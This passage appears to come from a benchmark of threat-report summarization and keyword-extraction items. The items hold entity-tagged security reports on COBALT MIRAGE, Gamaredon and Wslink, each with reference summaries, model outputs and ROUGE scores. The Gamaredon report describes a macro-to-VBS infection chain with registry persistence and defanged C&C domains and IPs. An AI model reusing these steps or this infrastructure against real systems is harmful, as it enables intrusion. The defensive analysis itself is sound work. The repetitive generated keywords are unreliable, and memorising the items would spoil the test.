is used to maintain access, exfiltrate data, and deploy ransomware tools like BitLocker. The threat actors move laterally using RDP and scripts, collecting credentials and scanning the environment. Ransomware attacks involve leaving printed ransom notes with email contacts, suggesting a manual victim coordination process. The targeted intrusions involve more hands-on activity inside networks and experimentation with ransomware. The blurred lines between financial and espionage motives makes COBALT MIRAGE an unpredictable threat. After disrupting their access, the threat actors have repeatedly regained access to environments using the same techniques. Their limited post-exploit capabilities suggest their access could be leveraged further given the weaknesses being exploited. Continued patching, multi-factor authentication, and monitoring for associated TTPs is advised. The report provides technical analysis of the group's custom tools, infrastructure, and techniques. It includes indicators of compromise to detect activity, though care should be taken before visiting potentially malicious sites. The adaptability of COBALT MIRAGE means organizations should closely monitor for similar activity that could indicate they are targeted. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4646017699115044, "gpt3/lexical/rouge_rouge2": 0.12888888888888891, "gpt3/lexical/rouge_rougeL": 0.22123893805309736, "gpt3/lexical/rouge_rougeLsum": 0.22123893805309736, "gpt3_generated_text": ["The article discusses the activities of the Iranian threat group known as COBALT MIRAGE. The group has been operating since at least June 2020 and is linked to the COBALT ILLUSION group. COBALT MIRAGE conducts both financially motivated attacks and espionage operations, blurring the line between the two. The group has been observed using phishing campaigns to gain initial access and has two distinct clusters of intrusions. In Cluster A, they use BitLocker and DiskCryptor to conduct opportunistic ransomware attacks for financial gain. Cluster B focuses on targeted intrusions to gather intelligence, but also experiments with ransomware. COBALT MIRAGE targets organizations in Israel, the US, Europe, and Australia and gains initial access through scan-and-exploit activities. They have exploited vulnerabilities in Fortinet FortiOS and Microsoft Exchange servers. The US Cybersecurity and Infrastructure Security Agency (CISA) has released an advisory regarding the group's activity. In January 2022, COBALT MIRAGE gained access to a US philanthropic organization's network through ProxyShell exploitation. The threat actors used a web shell and a Python-based proof-of-concept ProxyShell exploit in their attack. They dropped files on the web server and executed a custom Go binary that references GitHub repositories associated with Fast Reverse Proxy (FRP). The binary collects information about the host and establishes a tunnel to the defined infrastructure."]}, {"split_name": "test", "sample_id": "test_120", "prompt_text": "Extract the keywords: [CARDINAL] 4/27/2020Gamaredon [ORG] APT [ORG] Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence BlogTrend Micro About TrendLabs Security Intelligence BlogSearch : Home CategoriesHome \u00bb Malware [ORG] \u00bb [ORG] Gamaredon [ORG] APT [ORG] Group Use Covid-19 Lure in [ORG] CampaignsGamaredon [ORG] APT [ORG] Group Use Covid-19 Lure in CampaignsPosted on : [DATE] April 17 , [DATE] 2020 at [TIME] 5:12 [TIME] am [TIME] Posted in : Malware , Spam , [ORG] Targeted [ORG] Attacks Author : Trend Micro0By [PERSON] Hiroyuki [PERSON] Kakara and [PERSON] Erina [PERSON] Maruyama [PERSON] Gamaredon is an advanced persistent threat ( [ORG] APT ) group that has been active since [DATE] 2013 . Their campaigns are generally known for targeting [NORP] Ukrainian government institutions . From late 2019 to February of [DATE] this [DATE] year , researchers published several reports on [GPE] Gamaredon , tracking the group \u2019s activities . In [DATE] March , we came across an email with a malware attachment that used the [GPE] Gamaredon group \u2019s tactics . Some of the emails used the coronavirus pandemic as a topic to lure victims into opening emails and attachments . These campaigns targeted victims in [NORP] European countries and others . A brief history of [GPE] Gamaredon In [DATE] 2015 , researchers from [ORG] LookingGlass published the \ufb01rst report on [GPE] Gamaredon . According to that report , the early campaigns used [ORG] Microsoft [ORG] Word documents that , when inspected , showed that its most recent user went by the name of [PERSON] Armagedon ( a misspelled \u201c [PERSON] Armageddon \u201d ) , which became the basis of the group \u2019s namesake . The report also described [ORG] Gamaredon \u2019s political beginnings , particularly its ties to the Ukrainian revolution in [DATE] 2014 . Before the revolution they had targeted [NORP] Ukrainian government of\ufb01cials , opposition party members , and journalists . They moved on to [NORP] Ukrainian government institutions after the revolution . In [DATE] 2018 , [ORG] CERT- [ORG] UA published an advisory against the malware [ORG] Pterodo , which the group allegedly used . The group remained active , with several [GPE] Gamaredon - related activities reported in [DATE] February [DATE] 2020 . In [DATE] March , they were among the threat groups that were identi\ufb01ed taking advantage of the coronavirus pandemic to trick targets . [GPE] Gamaredon and Covid-19 - related cover emailsurl \u2026 [CARDINAL] 1/74/27/2020Gamaredon [ORG] APT [ORG] Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence BlogFigure 1 . The infection chain of the [GPE] Gamaredon campaignThe case we found arrived through a targeted email that contained a document \ufb01le ( in docx format ) . Opening document starts a template injection technique for loading the document template from the internet . The downloaded document template contains the malicious macro codes , which executes a VBScript ( VBS ) . We found a mechanism for decrypting , executing , and downloading an additional payload from the [ORG] C&C server . During the time of the analysis however , the [ORG] C&C server was not accessible , which made us unable to get additional payloads . The attacks we found all arrived through targeted emails ( MITRE [PERSON] ATT&CK framework ID T1193 ) . [CARDINAL] One of them even had the subject \u201c Coronavirus ( 2019 - nCoV ) . \u201d The use of socially relevant topics is a common practice for attackers who wish to make their emails and documents more tempting to open . The email that used the coronavirus - related subject came with an attached document \ufb01le . Opening this \ufb01le ( MITRE [PERSON] ATT&CK framework ID T1204 ) executes the template injection method ( MITRE [PERSON] ATT&CK framework ID T1221).Figure 2 . Code for downloading the document template with the malicious macroThe downloaded document template ( in dot format ) could differ slightly depending on each download . However , its Exif info or metadata remains consistent and shares the following details : Identi\ufb01cation : Word 8.0 Language code : [WORK_OF_ART] Russian [WORK_OF_ART] System : Windows Author : [LOC] \u0410\u0414\u041c\u0418\u041d ( \u201c Administrator \u201d in [LANGUAGE] Russian ) Code page : Windows CyrillicFigure 3 . A sample of malicious macro in the downloaded template documentAs mentioned , the template contains malicious macro ( MITRE [PERSON] ATT&CK framework ID T1064 ) , which exports [PERSON] VBS ( MITRE [PERSON] ATT&CK framework ID T1064 ) to execute itself . More speci\ufb01cally it drops \u201c % USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs , \u201d which is hardcoded in the macro , and then executed in \u201c wscript.exe //b % USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs . \u201dPlayList.vbs contains the obfuscated codes ( MITRE [PERSON] ATT&CK framework ID T1140 ) , which it executes after decrypting the obfuscations . This particular behavior is a slight departure from previously reported attacks by [GPE] Gamaredon , which did not use this technique . Figure [CARDINAL] 4 . A content sample for VBS dropped by malicious macrourl \u2026 [CARDINAL] 2/74/27/2020Gamaredon [ORG] APT [ORG] Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence BlogFigure [CARDINAL] 5 shows a snippet of the VBS executed by the [ORG] Execute function . The routines it follows are enumerated below . Figure [CARDINAL] 5 . A sample of executed VBS1 . Register the [ORG] RUN key in the registry below , so that the VBS \ufb01le is executed every time the machine starts ( MITRE [PERSON] ATT&CK framework ID T1060)Registry : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\MediaPlayer wscript.exe //b \uff05USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbsT1043 , T1071 , T1082 ) framework ID T1105 ) decrypted result is saved as \u201c % APPDATA%\\\\Microsoft\\Windows\\Cookies.exe \u201d ( T1001)2 . Connect with \u201c hxxp:// kristom[.]hopto[.]org /{computer name}_{hexadecimal volume serious number}/help_05_03[.]php \u201d ( MITRE ATT&CK framework IDs [CARDINAL] 3 . If the downloaded \ufb01le size in the \ufb01rst step exceeds [CARDINAL] 10,485 bytes , then the \ufb01le is saved as \u201c % APPDATA%\\\\Microsoft\\Windows\\Cookies.txt \u201d ( MITRE ATT&CK 4 . Use XOR for the \ufb01le saved from the [ORDINAL] second step , where [ORG] ASCII code converted from its own hexadecimal volume serial number is used as the key . The [CARDINAL] 5 . If the \ufb01le size of \u201c % APPDATA%\\\\Microsoft\\Windows\\Cookies.exe \u201d exceeds [CARDINAL] 4,485 bytes , it is executed . [CARDINAL] 6 . Both \u201c % APPDATA%\\\\Microsoft\\Windows\\Cookies.txt \u201d and \u201c % APPDATA%\\\\Microsoft\\Windows\\Cookies.exe \u201d are then deleted ( MITRE ATT&CKframework ID T1107)The observed routines of this VBS closely follow the other reports published on [GPE] Gamaredon , such as the one from [ORG] SentinelOne . However , the macro generated VBS was obfuscated in this case , likely as an additional evasive tactic . Interestingly , after decoding the VBS , we saw what appeared to be a programming mistake by the attacker . Lines 53 and [DATE] 54 in \ufb01gure [CARDINAL] 6 are for closing those downloaded and decoded [ORG] TXT and [ORG] EXE \ufb01les , which are variables de\ufb01ned right before the IF statement . If , however , these lines do not pass through this IF statement , an error would occur . It shows that this malware is not tested enough , and may still be under development . Our analysis found several URLs of the network destinations for both template injection and VBS . While resolving them to [ORG] IP addresses to understand their attack bases , we also found that they were all linked to the following [ORG] IP addresses . Network destination for template injection : [ORG] 176[.]119[.]147[.]225 [ORG] Network destination for VBS : 176[.]57[.]215[.]115These [ORG] IP addresses are from [NORP] Russian hosting companies . Most likely , the attackers rented [ORG] Virtual [ORG] Private [ORG] Server ( VPS ) as their attack base . Their URL for VBS ( shown below ) likely includes the data when they conducted the attack.hxxp://{FQDN}/{computer name}_{hexadecimal volume serial [LOC] number}/help_{day}_{month}[.]phpConclusion [LOC] Gameradon is not the \ufb01rst group to take advantage of the Covid-19 topic . Some cybercriminals have taken to indirect means of pro\ufb01ting , such as by targeting communication platforms that have increased in popularity after organizations shifted to work from home setups . In this case , they used Covid-19 as a cover for their relatively typical [ORG] APT routine . We recommend these countermeasures to prevent similar [ORG] APT attacks in the future : url \u2026 [ORG] 3/74/27/2020Gamaredon [ORG] APT [ORG] Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence BlogCheck the email sender , subject , and body for anything suspicious before downloading and opening email attachments . Be especially wary of unsolicited emails , that come from unknown senders . Check the \ufb01le extension of the attached \ufb01le and make sure it is the intended \ufb01le format . Avoid activating macro for any attached [ORG] Microsoft [ORG] Of\ufb01ce \ufb01les , especially for emails that request macro activation using an image of the body of the opened \ufb01le or those that do n\u2019t show anything . Watch out for spoofed domains embedded in emails before opening them . Subtle changes to a popular URL can be one indicator of malicious content . In addition to these actions , users can also implement a multi - layer approach and take advantage of these solutions . [ORG] Trend [ORG] Micro \u2122 [ORG] Smart [ORG] Protection [ORG] Suitesand Worry - Free \u2122 [ORG] Business [ORG] Security protects users and businesses from similar threats by detecting malicious \ufb01les and spammed messages as well as blocking all related malicious URLs . [ORG] Trend [ORG] Micro [ORG] Deep [ORG] Discovery \u2122 has an email inspection layer that can protect enterprises by detecting malicious attachments and URLs . [ORG] Trend [ORG] Micro \u2122 [ORG] Hosted [ORG] Email [ORG] Securityis a no - maintenance cloud solution that delivers continuously updated protection to stop spam , malware , spear phishing , ransomware , and advanced targeted attacks before they reach the network . It protects [ORG] Microsoft [ORG] Exchange , [ORG] Microsoft [ORG] Of\ufb01ce [ORG] 365 , Google Apps , and other hosted and on - premises email solutions . [ORG] Trend [ORG] Micro \u2122 Of\ufb01ceScan \u2122 with XGen \u2122 endpoint security infuses high-\ufb01delity machine learning with other detection technologies and global threat intelligence for comprehensive protection against advanced malware . The [ORG] Trend MicroTMXDR solution effectively protects connected emails , endpoints , servers , cloud workloads , and networks . [ORG] Trend [ORG] Micro [ORG] XDR uses powerful [ORG] AI and expert security analytics to correlate data , as well as deliver fewer yet higher-\ufb01delity alerts for early threat detection . In a single console , it provides a [ORG] Aurl \u2026 [ORG] 4/7Gamaredon [ORG] APT [ORG] Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog4/27/2020 [ORG] C&C addressesDetection [PERSON] Name [PERSON] Trojan . X97M.CVE20171 [CARDINAL] 1882.THCOCBO [ORG] TrojanSpy . Win32.FAREI T.UHBAZCLIZ Trojan . X97M.CVE20171 [CARDINAL] 1882.THCOCBO Backdoor . [ORG] Win32.REMC OS.USMANEAGFG Trojan . MSIL.AGENTTE SLA.THCOCBO [GPE] Trojan . X97M.CVE20171 [CARDINAL] 1882.THCOCBO Backdoor . [ORG] Win32.REMC OS.USMANEAGFE [ORG] TrojanSpy . Win32.FAREI [PERSON] T.UHBAZCLIZTrendX [PERSON] Downloader . [PERSON] VBA.TRX [PERSON] Downloader . [PERSON] VBA.TRX .XXVBAF01FF006 Troj . Win32.TRX.XXP Troj . Win32.TRX.XXP E50FFF034 Troj . Win32.TRX.XXP E50FFF034Bambinos[.]bounceme[.]net kristoffer[.]hopto[.]org kristom[.]hopto[.]org papir[.]hopto[.]org sabdja[.]3utilities[.]com sakira[.]3utilities[.]com seliconos[.]3utilities[.]com solod[.]bounceme[.]net sonik[.]hopto[.]org tele[.]3utilities[.]com violina[.]website voyager[.]myftp[.]biz voyaget[.]myftp[.]bizMitre [PERSON] ATT&CK [PERSON] Framework [PERSON] Related [PERSON] Posts : Operation ENDTRADE : Finding Multi - Stage Backdoors that TICK Spam Campaign Targets Colombian Entities with Custom - made \u2018 Proyecto RAT , \u2019 Uses Email Service [ORG] YOPmail for [ORG] C&C [ORG] Mac [ORG] Backdoor [ORG] Linked to [ORG] Lazarus [ORG] Targets [ORG] Korean [ORG] Users [ORG] Outlaw [ORG] Updates [ORG] Kit [ORG] to [ORG] Kill [ORG] Older [ORG] Miner [ORG] Versions , Targets More [ORG] SystemsLearn how to protect Enterprises , [ORG] Small [ORG] Businesses , and [PERSON] Home [PERSON] Users from ransomware : ENTERPRISE\u00bbSMALL BUSINESS\u00bbHOME\u00bbTags : APTurl \u2026 [CARDINAL] 5/74/27/2020 0 CommentsTrendLabs \ud83d\udd12 [ORG] Privacy [ORG] PolicyGamaredon [ORG] APT [ORG] Group Use Covid-19 Lure in Campaigns - TrendLabs Security [PERSON] Intelligence [PERSON] BlogLogin\ue6031 [PERSON] Sort by [ORG] BestRecommend\uf108t [ORG] Tweet f [ORG] ShareStart the discussion \u2026 [ORG] LOG IN [ORG] WITHOR SIGN UP WITH DISQUS?SubscribeAdd Disqus to your siteAdd DisqusAddd \u2709 Security Predictions for 2020D N t S ll M D t \u26a0 [ORG] Cybersecurity in [DATE] 2020 will be viewed through many lenses \u2014 from differing attacker motivations and cybercriminal arsenal to technological developments and global threat intelligence \u2014 only so defenders can keep up with the broad range of threats . Read our security predictions for [CARDINAL] 2020.Business Process CompromiseAttackers are starting to invest in long - term operations that target speci\ufb01c processes enterprises rely on . They scout for vulnerable practices , susceptible systems and operational loopholes that they can leverage or abuse . To learn more , read our Security 101 : [ORG] Business [ORG] Process [ORG] Compromise . [ORG] Recent [ORG] PostsExposed [ORG] Redis [ORG] Instances [ORG] Abused [ORG] for [ORG] Remote [ORG] Code [ORG] Execution , Cryptocurrency Mining Grouping Linux IoT Malware Samples With Trend Micro ELF Hash [ORG] Gamaredon [ORG] APT [ORG] Group Use Covid-19 Lure in Campaigns Exposing Modular Adware : How DealPly , [NORP] IsErIk , and ManageX Persist in Systems April Patch [DATE] Tuesday : [PERSON] Fixes for Font - Related , [ORG] Microsoft [ORG] SharePoint , [ORG] Windows [ORG] Components [PRODUCT] VulnerabilitiesPopular [PRODUCT] PostsMore Than 8,000 Unsecured Redis Instances Found in the Cloud Raccoon Stealer \u2019s Abuse of Google Cloud Services and [ORG] Multiple [ORG] Delivery [ORG] Techniques [ORG] Dissecting [ORG] Geost : Exposing the Anatomy of the Android Trojan Targeting Russian Banks Operation Poisoned News : [ORG] Hong [ORG] Kong [ORG] Users [ORG] Targeted With [FAC] Mobile [FAC] Malware via [ORG] Local [ORG] News [ORG] Links [ORG] Coronavirus [ORG] Update App Leads to Project Spy Android and [ORG] iOS [ORG] SpywareStay Updated Email SubscriptionHome and [ORG] Home [ORG] Of\ufb01ce About Trend Micro Asia Paci\ufb01c Region ( [ORG] APAC ): [GPE] Australia / [GPE] New [GPE] Zealand , , [GPE] \u2f47 , \ub300\ud55c\ubbfc\uad6d ,   [LOC] Latin [LOC] America [LOC] Region ( LAR ): Brasil , [PERSON] M\u00e9xico [PERSON] North America Region ( [ORG] NABU ): [GPE] United [GPE] States , [LOC] Canada [LOC] Europe , [LOC] Middle [LOC] East , & Africa Region ( EMEA ): [GPE] France , [ORG] Deutschland [ORG] / [ORG] \u00d6sterreich [ORG] / [ORG] Schweiz , [GPE] Italia , \u0420\u043e\u0441\u0441\u0438\u044f , [GPE] Espa\u00f1a , [GPE] United [GPE] Kingdom / Irelandurl \u2026 [CARDINAL] 6/74/27/2020Gamaredon [ORG] APT [ORG] Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence BlogPrivacy Statement Legal Policies Copyright \u00a9 [DATE] 2020 Trend Micro Incorporated . All rights reserved.url \u2026 [CARDINAL] 7/7", "generated_text": "Gamaredon; APT; 2013; Ukraine; targets; email; attachments; access; the coronavirus pandemic; the emails; a template injection technique; the malware; the macros; a VBScript; a VBScript; the malware; C&C; additional payloads; the C&C server; the infection chain; the malware; ties; 2014; ties; the Ukrainian revolution; 2015; 2017; Europe; the group; use; socially relevant topics; the use; documents; targets; Europe; the use; The group; the attacks.", "ref_text": "<START-1>The PDF describes campaigns by the Gamaredon APT group, an active threat group since 2013 that typically targets Ukrainian government institutions. Gamaredon has been using COVID-19 themed phishing emails with malicious document attachments in recent campaigns targeting victims in Europe and elsewhere. The infection chain involves a docx file attachment that uses a template injection technique to download a malicious dot template file containing macros. The macros execute a VBScript that decrypts and downloads additional payloads. The campaigns follow typical Gamaredon tactics like using socially relevant lures and targeting government entities, but have added some new technical aspects like obfuscating the VBScript payload. The analysis uncovers infrastructure links between the campaigns, like common IP addresses of Russian hosting providers. Several malicious files, URLs, and IoCs are provided. The campaigns show how threat actors like Gamaredon are opportunistically using the pandemic in social engineering while continuing to refine their technical malware delivery tactics. Recommended mitigations for these kinds of cyber attacks are provided. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5194805194805195, "gpt3/lexical/rouge_rouge2": 0.17647058823529413, "gpt3/lexical/rouge_rougeL": 0.29220779220779225, "gpt3/lexical/rouge_rougeLsum": 0.29220779220779225, "gpt3_generated_text": ["The article discusses the activities of the Gamaredon APT group, which has been active since 2013 and primarily targets Ukrainian government institutions. Recently, researchers have uncovered campaigns by Gamaredon that use the coronavirus pandemic as a lure in emails and attachments to target victims in European countries. The article provides a brief history of Gamaredon, including its ties to the Ukrainian revolution in 2014. The group's latest campaign involves targeted emails with document attachments that use a template injection technique to download malicious macros and execute a VBScript. The article highlights the use of socially relevant topics, such as the coronavirus pandemic, by attackers to make their emails and documents more enticing to open. The attacks by Gamaredon have been observed to arrive through targeted emails and utilize various tactics to access victims' systems and potentially download additional payloads from a C&C server."]}, {"split_name": "test", "sample_id": "test_121", "prompt_text": "Extract the keywords: ESET Research white papersTLP : WHITEUnder the hood of [ORG] Wslink [ORG] \u2019s [ORG] Vladislav [ORG] Hr\u010dkaMarch [CARDINAL] 20222CONTENTSExecutive summary [CARDINAL] 5 General structure of virtual machines [CARDINAL] 5 Documented techniques for deobfuscation of virtual machines [CARDINAL] 11 The [ORG] Miasm framework [CARDINAL] 12Wslink \u2019s virtual machine entry \u2013 vm_entry [DATE] 13Packer [DATE] 14Junk code [DATE] 16Virtual machine initialization17 vm_pre_init ( ) functions [CARDINAL] 17 vm_init ( ) function [CARDINAL] 18Virtual instructions [CARDINAL] 20 [GPE] Virtual instructions of the [ORDINAL] second virtual machine [CARDINAL] 24 The [ORDINAL] first virtual instruction [CARDINAL] 24 The [ORDINAL] second virtual instruction [CARDINAL] 25 The [ORDINAL] third virtual instruction [CARDINAL] 25 The [ORDINAL] fourth virtual instruction [CARDINAL] 26 Automating analysis of the virtual instructions [CARDINAL] 27 Getting back to the [ORDINAL] first virtual machine [CARDINAL] 29 The initial virtual instruction [CARDINAL] 30 Analysis of the virtual context [CARDINAL] 33 The [ORDINAL] first executed virtual instruction [CARDINAL] 34 The [ORDINAL] second executed virtual instruction [CARDINAL] 36 The [ORDINAL] third executed virtual instruction [CARDINAL] 36 The [ORDINAL] fourth executed virtual instruction [CARDINAL] 38Initially executed virtual instructionsProcessing the initial bytecode blockAutomating analysis of the [ORDINAL] first virtual machine [CARDINAL] 39 [CARDINAL] 40 Opaque predicates [CARDINAL] 41 Overview 41Description of our final VM analyzer code [CARDINAL] 45 Class Wslink [CARDINAL] 45 Class VirtualContext 45 Method get_next_instr ( ) [CARDINAL] 45 Method get_irb_symbs ( ) 45 Method get_updated_internal_context ( ) [CARDINAL] 45 Class MySymbolicExecutionEngine 45 Class SymbolicCFG 46 Class [PERSON] Node 46Future work 46Conclusion [ORG] 473LIST [ORG] OF [ORG] TABLES [ORG] Table 1.Miasm \u2019s [ORG] IR semantics [DATE] 13Table [DATE] 2Statistics of the initial virtual instructionTable [CARDINAL] 3Statistics of the [ORDINAL] first executed virtual instructionTable [CARDINAL] 4Statistics of the [ORDINAL] second executed virtual instruction303636Table [CARDINAL] 5Statistics of the [ORDINAL] third executed virtual instruction 37Table [CARDINAL] 6Statistics of the [ORDINAL] fourth executed virtual instruction [CARDINAL] 38Table 7Statistics of the [ORDINAL] first processed bytecode block [CARDINAL] 44LIST OF FIGURES Figure [CARDINAL] 1.Illustration of bytecode , where all opcodes and operands are virtual [CARDINAL] 6Figure [CARDINAL] 2Illustration of the relationship between bytecode and the VM \u2019s interpreter [CARDINAL] 7Figure [CARDINAL] 3Illustration of [ORG] Switch [ORG] Dispatch , where [GPE] R0 is a virtual register8Figure [CARDINAL] 4.Illustration of [ORG] Direct [ORG] Threading [ORG] 9Figure [CARDINAL] 5.Overview of the virtualization process [CARDINAL] 10Figure [CARDINAL] 6Entry point to the virtual machine 13Figure [CARDINAL] 7A part of vm_entry of the virtual machine decompiled with Ghidra 14Figure 8Function used to unpack [PERSON] NsPack in ClamAV15Figure [CARDINAL] 9A block of code in [ORG] Miasm [ORG] \u2019s symbolic execution ( left ) and a part of the same block in [ORG] IDA [ORG] \u2019s decompiler ( right ) [CARDINAL] 16Figure [CARDINAL] 10 [ORG] Miasm [ORG] \u2019s symbolic execution of a vm_pre_init()showing parameters supplied to [ORG] vm_init ( ) [CARDINAL] 17Figure [CARDINAL] 11Busy - waiting for interpreter in [PERSON] vm_init ( ) [CARDINAL] 18 Figure [CARDINAL] 12 vm_init ( ) summary [CARDINAL] 19 Figure [CARDINAL] 13 Virtual instruction table 20Figure 14 The [ORDINAL] first virtual instruction in the table 20Figure [CARDINAL] 15 One of the vm_pre_init ( ) functions Figure [CARDINAL] 16 [ORG] Miasm [ORG] \u2019s symbolic execution of the first21virtual instruction ( function at [CARDINAL] 0x0FF2DB ) [CARDINAL] 21Figure 17Miasm \u2019s symbolic execution of the [ORDINAL] first block of [CARDINAL] vm2_init ( ) [CARDINAL] 22 Figure [CARDINAL] 18 [ORG] Miasm [ORG] \u2019s symbolic execution of the [ORDINAL] first block of [ORG] vm_init ( ) [CARDINAL] 23 Figure [CARDINAL] 19 A part of the [ORDINAL] second virtual instruction table [CARDINAL] 23Figure [CARDINAL] 20 [GPE] Virtual instructions in the structure of the virtual machines [CARDINAL] 24Figure [CARDINAL] 21 The initial virtual instruction of the [ORDINAL] second VM254Figure [CARDINAL] 22 [PERSON] Bytecode of the virtual instruction 25Figure [CARDINAL] 23 Destination address and memory modifiedby the [ORDINAL] second virtual instruction 25Figure [CARDINAL] 24 Destination address and memory modifiedby the [ORDINAL] third virtual instruction 25Figure [CARDINAL] 25 The conditional branch and delta of thestack pointer of the [ORDINAL] fourth virtual instruction 26Figure [CARDINAL] 26 Destination address and memory modified bythe [ORDINAL] fourth virtual instruction 26Figure [CARDINAL] 27 Call graph generated from memory assignments and the [ORG] VPC 28Figure [CARDINAL] 28 [GPE] Virtual instructions in the structure of the virtual machines [CARDINAL] 29Figure [CARDINAL] 29 Control flow graph of the initial virtual instruction 30Figure 30 Beginning of the intro finishing context switch of the [ORDINAL] second VM 31Figure [DATE] 31Virtual registers of the [ORDINAL] second machine being mapped back to the native ones at the end of the virtual instruction 32Figure [CARDINAL] 32 Last few virtual instructions executed beforemapping the virtual registers back to the native ones [DATE] 33Figure [DATE] 33 Zeroing out an internal register 35Figure [CARDINAL] 34 Storing the stack pointer in an internal register 37Figure [CARDINAL] 35 Part of the [ORDINAL] fourth virtual instruction 38Figure [CARDINAL] 36 Part of the [ORDINAL] fourth virtual instruction performing a pop - like operation 38Figure [CARDINAL] 37 Part of the [ORDINAL] fourth virtual instruction performing a [ORG] PUSH operation39Figure [CARDINAL] 38 The [ORDINAL] first processed bytecode block [DATE] 40Figure [DATE] 39 [DATE] Expressions that can be further simplified [TIME] 41Figure [TIME] 40 [TIME] Code of the processed bytecode42Figure [CARDINAL] 41 [ORG] Data accessed by the code \u2013 ServiceStatus 42Figure [CARDINAL] 42 Function whose pointer is used in the code 43Figure 43 Destination address of the bytecode [DATE] 43Figure [DATE] 44 Setting return address of the API call 43Figure 45 Body of the code \u2019s loopFigure [DATE] 46 The same part of code in the non - obfuscated binary44445EXECUTIVE SUMMARY ESET researchers recently described [GPE] Wslink , a unique and previously undocumented malicious loader that runs as a server and that features a virtual - machine - based obfuscator There are no code , functionality or operational similarities that suggest this is likely to be a tool from a known threat actor ; the complete analysis of the malware can be found hereIn this white paper we describe the structure of the virtual machine used in samples of [GPE] Wslink and suggest a possible approach to see through the obfuscation techniques used in the analyzed samples We demonstrate our approach on chunks of code of the protected sample We were not motivated to fully deobfuscate the code , because we discovered a non - obfuscated sampleObfuscation techniques are a kind of software protection intended to make code hard to understand and hence conceal its objectives ; obfuscating virtual machine techniques have become widely misused for illicit purposes such as obfuscation of malware samples as they hinder both analysis and detection The ability to analyze malicious code and subsequently improve our detection capabilities is behind our motivation to overcome these techniquesVirtualized Wslink samples do not contain any clear artifacts , such as specific section names , that easily link it to a known virtualization obfuscator During our research , we were able to successfully design and implement a semiautomatic solution capable of significantly facilitating analysis of the underlying program \u2019s code The virtual machine introduced a diverse arsenal of obfuscation techniques , which we were able to overcome to reveal a part of the deobfuscated malicious code that we describe in this document In the last sections of this analysis , we present parts of the code we developed to facilitate our researchThis white paper also provides an overview of the internal structure of virtual machines in general , and introduces some important terms and frameworks used in our detailed analysis of the [GPE] Wslink virtual machineIn the past we described the structure of a custom virtual machine , along with our techniques to devirtualize the machine That virtual machine contained an interesting anti - disassembly trick , previously utilized by [ORG] FinFisher \u2013 spyware with extensive spying capabilities , such as live surveillance through webcams and microphones , keylogging , and exfiltration of files We additionally presented an approach for its deobfuscation You can find more information about that case in this earlier white paper [ORG] OVERVIEW [ORG] OF [ORG] VIRTUAL [ORG] MACHINE STRUCTURES Before diving into the analysis of [ORG] Wslink [ORG] \u2019s virtual machine ( VM ) , we provide an overview of the internal structure of virtual machines in general , describe known approaches to deal with such obfuscation and introduce some important terms and frameworks used in our detailed analysis of the Wslink VMGeneral structure of virtual machines [GPE] Virtual machines can be divided into [CARDINAL] two main categories:1 . System virtual machines \u2013 support execution of complete operating systems ( e g , various [ORG] VMWareproducts , [GPE] VirtualBox)2 . Process virtual machines \u2013 execute individual programs in an OS - independent environment ( e g , [PERSON] Java , [PERSON] theNET [PERSON] Common [PERSON] Language Runtime)Here , we are interested only in the [ORDINAL] second category \u2013 process virtual machines \u2013 and we will briefly describe certain parts of their internal anatomy necessary to understand the rest of this paper6Process virtual machines run as normal applications on their host OSes , and in turn run programs whose code is stored as OS - independent bytecode ( Figure [CARDINAL] 1 ) that represents a series of instructions \u2013 an application \u2013 of a virtual [ORG] ISA ( instruction set architecture)Figure [CARDINAL] 1 . Illustration of bytecode , where all opcodes and operands are virtualOne can also think about bytecode as a sort of intermediate representation ( IR ) ; an abstract representation of code consisting of a specific instruction set that resembles assembly more than a high - level language It is also known as intermediate languageThe use of [ORG] IR is convenient in terms of code reusability \u2013 when one needs to add support for a new architecture or CPU instruction set , it is easier to convert it to the IR instead of writing all the required algorithms again Another benefit is that it can simplify the application of some optimization algorithmsOne can generally translate both high- and low - level languages into [ORG] an [ORG] IR [ORG] Translation of a higher - level language is known as \u201c lowering \u201d , and similarly translation of a lower - level one , \u201c lifting\u201dThe following example lifts an assembly block bb0 into a block with the pseudo - IR code irb0 All assembly instructions are translated into a set of [ORG] IR operations and individual operations in sets do not affect each other , where [ORG] ZF stands for [CARDINAL] zero flag and CF for carry flag : bb0 : [ORG] MOV [ORG] R8 , [CARDINAL] 0x05SUB [ORG] AX , [ORG] DXXCHG [ORG] ECX , EDXirb0 : R8 = 0x05EAX[:0x10 ] = EAX[:0x10 ] \u2013 EDX[:0x10]ZF = EAX[:0x10 ] \u2013 EDX[:0x10 ] = = 0x00CF = EAX[:0x10 ] < EDX[:0x10 ] ECX = [ORG] EDXEDX = [NORP] ECXModern process VMs usually provide a compiler that can lower code written in a high - level language -- one that is easy to understand and comfortable to use \u2013 into the respective bytecodeA VM \u2019s [ORG] ISA generally defines the supported instructions , data types and registers , among other things , that naturally must be implemented by a virtual [ORG] ISA as wellInstructions consist of the following [CARDINAL] parts:\u2022 opcodes \u2013 operation codes that specify an instruction \u2022 operands \u2013 parameters of the instructions7ISAs often use [CARDINAL] two well - known virtual registers:\u2022 virtual program counter ( [ORG] VPC ) \u2013 a pointer to the current position in the bytecode \u2022 virtual stack pointer \u2013 a pointer to pre - allocated virtual stack space used internally by the VMThe virtual stack pointer does not have to be present in all VMs ; it is common only in a certain type of VM \u2013 stack - based onesWe will refer to the instructions and their respective parts of a virtual [ORG] ISA simply as virtual instructions , virtual opcodes , and virtual operands We sometimes omit the explicit use of \u201c virtual \u201d when it is obvious that we are talking about the virtual representationAn OS - dependent ( Figure [CARDINAL] 2 ) executable file \u2013 interpreter \u2013 processes the supplied bytecode and sequentially interprets the underlying virtual instructions thus executing the virtualized programFigure 2 Illustration of the relationship between bytecode and the VM \u2019s interpreterTransfer of control from [CARDINAL] one virtual instruction to the next during interpretation needs to be performed by every VM This process is generally known as dispatching There are several documented dispatch techniques such [PERSON] 